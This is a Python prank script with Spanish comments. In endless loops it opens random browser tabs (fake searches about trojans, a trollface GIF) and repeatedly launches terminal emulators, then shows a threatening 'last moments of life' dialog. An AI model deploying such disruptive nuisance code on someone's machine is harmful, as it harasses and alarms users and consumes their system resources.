from sys import exc_info
from os import path, system
from random import choice
from webbrowser import open
from time import sleep
from tkinter import messagebox

# Por si hay algún error
def handle(e):
     exc = f"""
Error en el archivo {__file__}:
Nombre del error: {type(e).__name__}

Descripción del error: {e}
               """
               
     exc_type, exc_obj, exc_tb = exc_info()
     fname = path.split(exc_tb.tb_frame.f_code.co_filename)[1]
     print(exc_type, fname, exc_tb.tb_lineno)

def webOpen():
     try:
          while True:
               tup_searches = (
                    'https://www.google.com/search?q=como+eliminar+virus+troyano+linux+atacante',
                    'https://www.google.com/search?q=ayuda+mi+computador+hace+cosas+raras',
                    'https://www.google.com/search?q=por+que+mi+pc+abre+pestañas+aleatorias',
                    'https://www.google.com/search?q=descargar+hack+among+us+2020+octubre',
                    'https://www.google.com/search?q=como+curar+el+conjuntivitis',
                    'https://www.google.com/search?q=que+hacer+si+me+embargan+la+casa',
                    'https://www.google.com/search?q=descargar+minecraft+premium+gratis+linux+tentador+2020',
                    'http://4.bp.blogspot.com/-w6UkeTKqd3E/UpdEMzDKJFI/AAAAAAAAFEE/rh0BkH-AklU/s1600/3d-trollface-nodding-ok-yes-agree-troll-face.gif'
               )
               open(choice(tup_searches))
               sleep(10)               
               
     except KeyboardInterrupt:
          print("XD")

     except Exception as e:
          handle(e)
          
def annoying_behavior():
     try:
          while True:
#              Esto básicamente mueve el ratón a una
#              posición aleatoria comprendida entre
#              1 y 256
               sleep(2)
               
#              Intenta abrir diferentes emuladores
#              de terminal
               system('qterminal')
               
               system('terminator')
               
               system('alacritty')
          
               
               system('xterm')
               
               system('konsole')
               
               
               system('xfce4-terminal-emulator')
               
     except KeyboardInterrupt:
          print("XD")
     except Exception as e:
          handle(e)
          messagebox.askquestion(title="Sigues ahi?", message="Sigues usando el pc? disfruta sus  ultimos instantes de vida")

               